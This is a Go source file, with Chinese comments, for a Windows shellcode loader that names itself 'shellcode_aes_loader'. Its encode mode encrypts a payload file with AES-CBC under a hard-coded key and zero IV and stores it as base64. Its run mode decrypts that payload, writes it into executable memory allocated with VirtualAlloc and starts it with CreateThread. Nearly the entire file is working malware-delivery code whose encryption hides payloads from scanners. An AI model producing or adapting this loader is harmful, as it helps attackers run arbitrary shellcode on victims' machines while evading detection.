package cryptx

import (
    "bytes"
    "crypto/aes"
    "crypto/cipher"
    "encoding/base64"
    "fmt"
    "os"
    "runtime"
    "syscall"
    "unsafe"
)

const (
    KeyString   = "dingzhen88888888" // 16字节密钥
    OutputFile  = "code.bin"
    PreviewSize = 32
)
func EncodeFile(input, output string, key []byte) error {
    return encodeShellcode(input, output, key)
}

// 导出解密函数
func DecodeFile(input string, key []byte) ([]byte, error) {
    return decodeShellcode(input, key)
}


func pkcs7Padding(data []byte, blockSize int) []byte {
    padding := blockSize - len(data)%blockSize
    padText := bytes.Repeat([]byte{byte(padding)}, padding)
    return append(data, padText...)
}

func pkcs7Unpadding(data []byte) ([]byte, error) {
    length := len(data)
    if length == 0 {
        return nil, fmt.Errorf("输入数据为空")
    }
    padding := int(data[length-1])
    if padding <= 0 || padding > length {
        return nil, fmt.Errorf("无效的填充")
    }
    return data[:length-padding], nil
}

func aesEncrypt(plaintext, key []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, fmt.Errorf("创建 AES 密钥失败: %w", err)
    }
    iv := make([]byte, aes.BlockSize)
    mode := cipher.NewCBCEncrypter(block, iv)
    paddedText := pkcs7Padding(plaintext, aes.BlockSize)
    ciphertext := make([]byte, len(paddedText))
    mode.CryptBlocks(ciphertext, paddedText)
    return ciphertext, nil
}

func aesDecode(data, key []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, fmt.Errorf("创建 AES 密钥失败: %w", err)
    }
    iv := make([]byte, aes.BlockSize)
    mode := cipher.NewCBCDecrypter(block, iv)
    plaintext := make([]byte, len(data))
    mode.CryptBlocks(plaintext, data)
    return pkcs7Unpadding(plaintext)
}

func encodeShellcode(input, output string, key []byte) error {
    content, err := os.ReadFile(input)
    if err != nil {
        return fmt.Errorf("读取文件失败: %w", err)
    }
    ciphertext, err := aesEncrypt(content, key)
    if err != nil {
        return fmt.Errorf("加密失败: %w", err)
    }
    base64Data := base64.StdEncoding.EncodeToString(ciphertext)
    return os.WriteFile(output, []byte(base64Data), 0644)
}

func decodeShellcode(input string, key []byte) ([]byte, error) {
    encodeDataByte, err := os.ReadFile(input)
    if err != nil {
        return nil, fmt.Errorf("读取文件失败: %w", err)
    }
    content, err := base64.StdEncoding.DecodeString(string(encodeDataByte))
    if err != nil {
        return nil, fmt.Errorf("Base64 解码失败: %w", err)
    }
    return aesDecode(content, key)
}

func runShellcode(shellcode []byte) {
    kernel32 := syscall.MustLoadDLL("kernel32.dll")
    VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
    CreateThread := kernel32.MustFindProc("CreateThread")
    WaitForSingleObject := kernel32.MustFindProc("WaitForSingleObject")

    var addr uintptr
    var thread uintptr
    var err error

    // 自动识别 32/64 位架构
    if runtime.GOARCH == "amd64" {
        // 64位
        addr, _, err = VirtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000|0x2000, 0x40)
    } else {
        // 32位
        addr, _, err = VirtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000|0x2000, 0x40)
    }
    if addr == 0 {
        fmt.Println("VirtualAlloc 失败:", err)
        return
    }

    copy((*[1 << 20]byte)(unsafe.Pointer(addr))[:], shellcode)

    if runtime.GOARCH == "amd64" {
        thread, _, err = CreateThread.Call(0, 0, addr, 0, 0, 0)
    } else {
        thread, _, err = CreateThread.Call(0, 0, addr, 0, 0, 0)
    }
    if thread == 0 {
        fmt.Println("CreateThread 失败:", err)
        return
    }

    WaitForSingleObject.Call(thread, syscall.INFINITE)
}

func main() {
    if len(os.Args) < 3 {
        fmt.Println("用法:")
        fmt.Println("  加密: shellcode_aes_loader encode payload.bin")
        fmt.Println("  解密并运行: shellcode_aes_loader run code.bin")
        return
    }

    key := []byte(KeyString)
    mode := os.Args[1]

    switch mode {
    case "encode":
        input := os.Args[2]
        if err := encodeShellcode(input, OutputFile, key); err != nil {
            fmt.Println("加密失败:", err)
            return
        }
        fmt.Println("加密成功，输出文件:", OutputFile)

    case "run":
        input := os.Args[2]
        shellcode, err := decodeShellcode(input, key)
        if err != nil {
            fmt.Println("解密失败:", err)
            return
        }

        fmt.Printf("解密后 shellcode 长度: %d\n", len(shellcode))

        previewLen := PreviewSize
        if len(shellcode) < previewLen {
            previewLen = len(shellcode)
        }
        fmt.Printf("shellcode 前%d字节: % x\n", previewLen, shellcode[:previewLen])

        if len(shellcode) > 0 {
            runShellcode(shellcode)
        } else {
            fmt.Println("解密结果为空，不执行 shellcode")
        }

    default:
        fmt.Println("未知模式:", mode)
    }
}
